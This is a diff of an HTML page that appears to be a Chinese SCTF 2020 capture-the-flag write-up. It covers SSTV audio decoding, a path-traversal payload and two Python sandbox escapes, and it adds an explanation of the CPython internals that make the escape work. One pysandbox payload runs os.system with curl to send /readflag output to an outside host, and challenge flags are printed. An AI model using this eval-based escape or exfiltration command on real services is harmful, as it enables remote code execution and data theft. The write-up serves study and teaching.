@@ -205,7 +205,7 @@ print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, jso
 <p>搜索 “空间站” “接收机” 信息 音频 等关键字找到<br><a href="https://zhuanlan.zhihu.com/p/98103018" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98103018</a><br><a href="https://www.sohu.com/a/159552694_610733" target="_blank" rel="noopener">https://www.sohu.com/a/159552694_610733</a><br>SSTV关键字</p>
 <p><a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br><a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04" target="_blank" rel="noopener">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
 <p>下载 mmsstv<br>修改录音设备为立体声混音<br>具体操作为：Option-&gt;Soundcard input level<br>播放音频得到flag:</p>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5948"><br>SCTF{f78fsd1423fvsa}</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p>
 <h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
 <pre><code class="javascript=">HTTP/1.1 200 OK
 Content-Disposition: attachment; filename=&quot;dc62d163f53ce13369ab97041706060c&quot;
@@ -363,7 +363,7 @@ class IndexController extends Controller
 })-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre>
 <p>直接任意文件读取，但是因为两个../服务器不会解析直接报错的原因无法穿到根目录，后来想到在弄个index.php就好了<br>最后的payload:<a href="http://39.104.93.188/index.php/tmp/../../flag" target="_blank" rel="noopener">http://39.104.93.188/index.php/tmp/../../flag</a></p>
 <p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
-<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><p>app.py</p>
+<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p>
 <pre><code class="python=">from flask import Flask, request
 
 app = Flask(__name__)
@@ -403,7 +403,7 @@ Content-Length: 248
 Content-Disposition: form-data; name=&quot;cmd&quot;
 
 request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
-------WebKitFormBoundaryx3B8HB5b--</code></pre><h2 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h2><p>payload:</p>
+------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p>
 <pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#39;) HTTP/1.1
 Host: 39.104.90.30:10006
 Pragma: no-cache
@@ -422,8 +422,30 @@ Content-Disposition: form-data; name=&quot;cmd&quot;
 
 request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
 ------WebKitFormBoundaryx3B8HB5b--
-</code></pre><h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image13597"></p>
+</code></pre><h3 id="为何payload能运行"><a href="#为何payload能运行" class="headerlink" title="为何payload能运行"></a>为何payload能运行</h3><p>我们都知道python 调用类方法的时候会传入<code>self</code>参数，而我们调用<code>app.config==request.args.a</code>应该也会传入self参数，那么为什么这个payload可以成功</p>
+<p>测试代码</p>
+<pre><code class="python">class A():
+    pass
+a = A()
+a.__class__.__eq__=eval
+a==&quot;print(123)&quot;
+</code></pre>
+<p>我们跟进python底层看看</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p>
+<p>这里显示nargs显示只有1个参数，参看堆栈，跟踪到最开始的地方</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p>
+<p>这里我们确实传入了self,其中v是<code>self</code>,w是<code>print(123)</code></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p>
+<p>在<code>call_unbound</code>处我们发现了原因，是因为ubound==0</p>
+<p>在<code>lookup_maybe_method</code>中设置了ubound的值</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p>
+<p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p>
+<blockquote>
+<p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p>
+</blockquote>
+<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p>
 <pre><code>http://39.99.41.124/public/log.txt
 http://39.99.41.124/public/test/
 http://39.99.41.124/public/nationalsb/login.php
